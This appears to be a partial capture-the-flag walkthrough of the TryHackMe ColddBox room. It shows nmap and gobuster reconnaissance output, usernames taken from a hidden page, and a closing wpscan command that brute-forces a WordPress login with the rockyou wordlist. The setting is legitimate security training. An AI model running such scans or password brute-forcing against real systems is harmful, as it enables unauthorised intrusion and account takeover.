

https://tryhackme.com/r/room/colddboxeasy

Scan all ports on target machine
```
root@ip-10-10-130-216:~# nmap -p- 10.10.50.140 
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-18 15:28 GMT
Nmap scan report for 10.10.50.140
Host is up (0.00047s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
80/tcp   open  http
4512/tcp open  unknown
MAC Address: 02:D3:49:02:1C:E1 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 5.04 seconds
```

Scan all open ports on target machine and enumerate the service version and any common vulns. 
```
root@ip-10-10-130-216:~# nmap -p 80,4512 -sVC 10.10.50.140 
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-18 15:30 GMT
Nmap scan report for 10.10.50.140
Host is up (0.00022s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.1.31
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: ColddBox | One more machine
4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4e:bf:98:c0:9b:c5:36:80:8c:96:e8:96:95:65:97:3b (RSA)
|   256 88:17:f1:a8:44:f7:f8:06:2f:d3:4f:73:32:98:c7:c5 (ECDSA)
|_  256 f2:fc:6c:75:08:20:b1:b2:51:2d:94:d6:94:d7:51:4f (ED25519)
MAC Address: 02:D3:49:02:1C:E1 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.40 seconds

```

Enumerate directories with the big.txt wordlist 
Add the extensions php, text, js and html to the end of each fuzzing word. 
```
root@ip-10-10-130-216:~# gobuster dir -u http://10.10.50.140 -w /usr/share/wordlists/dirb/big.txt -x php,txt,js,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.50.140
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,js,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/.htaccess.js         (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/.htpasswd.js         (Status: 403) [Size: 277]
/hidden               (Status: 301) [Size: 313] [--> http://10.10.50.140/hidden/]
/index.php            (Status: 301) [Size: 0] [--> http://10.10.50.140/]
/license.txt          (Status: 200) [Size: 19930]
/readme.html          (Status: 200) [Size: 7173]
/server-status        (Status: 403) [Size: 277]
/wp-admin             (Status: 301) [Size: 315] [--> http://10.10.50.140/wp-admin/]
/wp-content           (Status: 301) [Size: 317] [--> http://10.10.50.140/wp-content/]
/wp-includes          (Status: 301) [Size: 318] [--> http://10.10.50.140/wp-includes/]
/wp-login.php         (Status: 200) [Size: 2547]
/wp-config.php        (Status: 200) [Size: 0]
/wp-trackback.php     (Status: 200) [Size: 135]
/xmlrpc.php           (Status: 200) [Size: 42]
Progress: 102345 / 102350 (100.00%)
===============================================================
Finished
===============================================================
```

On the page 10.10.50.140/hidden
```
U-R-G-E-N-T
C0ldd, you changed Hugo's password, when you can send it to him so he can continue uploading his articles. Philip
```
There are possibly three users on the server, Hugo, C0ldd and Philip


http://10.10.50.140/license.txt
The website is running a wordpress site. 
```
WordPress - Web publishing software
```

```
wpscan --url http://10.10.97.3 -U c0ldd -P /usr/share/wordlists/rockyou.txt
```